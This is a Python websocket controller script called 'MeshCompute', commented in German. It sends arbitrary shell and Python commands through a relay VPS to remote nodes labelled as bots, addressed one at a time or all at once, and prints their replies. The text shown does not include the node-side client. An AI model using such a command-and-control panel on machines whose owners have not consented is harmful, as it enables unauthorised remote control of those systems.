import asyncio
import websockets
import json
import time
from colorama import init, Fore, Style

init(autoreset=True)

VPS_URL = "ws://DEINE_VPS_IP_HIER:8765"   # ←←← HIER ÄNDERN!

async def controller():
    while True:
        try:
            async with websockets.connect(VPS_URL) as ws:
                # Als Controller anmelden
                await ws.send(json.dumps({"type": "controller"}))

                print(f"{Fore.GREEN}✅ Verbunden mit VPS{Style.RESET_ALL}")
                print(f"{Fore.MAGENTA}=== MeshCompute Controller ==={Style.RESET_ALL}\n")

                # Konsolen-Task
                async def console_input():
                    while True:
                        cmd = await asyncio.get_event_loop().run_in_executor(
                            None, input, f"{Fore.WHITE}mesh> {Style.RESET_ALL}"
                        )
                        if not cmd.strip():
                            continue
                        parts = cmd.strip().split(maxsplit=2)
                        action = parts[0].lower()

                        if action == "help":
                            print("list | ping <id|all> | system_info <id|all> | shell <id|all> befehl | python <id|all> code")
                            continue

                        msg = {
                            "type": "command",
                            "target": parts[1] if len(parts) > 1 else "all",
                            "action": action,
                            "payload": parts[2] if len(parts) > 2 else None,
                            "task_id": str(int(time.time() * 1000))[-8:]
                        }
                        await ws.send(json.dumps(msg))
                        print(f"{Fore.CYAN}→ Befehl gesendet: {action}{Style.RESET_ALL}")

                # Zwei Tasks parallel laufen lassen
                await asyncio.gather(console_input(), receive_results(ws))

        except Exception as e:
            print(f"{Fore.RED}Verbindung zum VPS verloren: {e}{Style.RESET_ALL}")
            await asyncio.sleep(5)


async def receive_results(ws):
    try:
        async for message in ws:
            data = json.loads(message)
            if data["type"] == "result":
                bot_id = data.get("bot_id", "Unknown")
                print(f"{Fore.YELLOW}📤 [{bot_id}] {data.get('data')}{Style.RESET_ALL}")
    except:
        pass


if __name__ == "__main__":
    asyncio.run(controller())